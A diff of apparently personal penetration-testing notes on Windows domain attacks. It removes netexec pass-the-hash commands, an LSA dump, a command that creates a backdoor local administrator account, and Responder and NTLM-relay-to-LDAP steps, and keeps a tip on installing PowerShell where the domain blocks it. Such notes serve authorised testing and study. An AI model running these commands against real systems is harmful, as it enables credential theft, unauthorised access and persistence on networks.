@@ -1,38 +1,3 @@
-Pass The Hash Attack 
-netexec smb IP -u Administrator -H HASH --localauth 
-netexec smb IP -u Administrator -H HASH --localauth --lsa 
-
-	--lsa:
-	passwords that are stored in the windows history in a clear text. 
-
-	similarly we can pass the hash in the network using Subnet. 
-
-netexec smb SUBNETIP -u Administrator -H HASH --localauth
-
-we can also add the particular user in the domain using the commands 
-
-netexec smb IP -u Administrator -H Hashes -x 'net user pentest Pentest@123 && net localgroup Administrators pentest /add' 
-
-	to check if the system has the EDR; use the tool smbclient(impacket-smbclient) as localadministrator; rdp into the system	(ProgramFiles/system32)(use the tool magnet capture 	to dump ram and user the tool votality(forensics tool to ananlys the ram dump))
-	 
-
-
-What if the SMB signing is enabled in the network-- use this traffic to relay it to the LDAP protocol (SMB -> HTTP -> LDAP/LDAPS)
-Cross Protocol Relay 
-
-
-
-#LLMNR is a protocol, NTLM is a hash
-
-
-LDAP Relay attack -- 
-Responder - we look for the HTTP responses, switch to the LDAP attack run the impackt, target the ldap services running on the ldap services and perform the services which are present in the domain. 
-
-responder -I eth0 
-disable the SMB,HTTP server from the config file 
-
-
-
 
 Install powershell on the system manually by pwsh.exe (even if the PS is blocked from the domain)
 https://github.com/PowerShell/PowerShell/releases
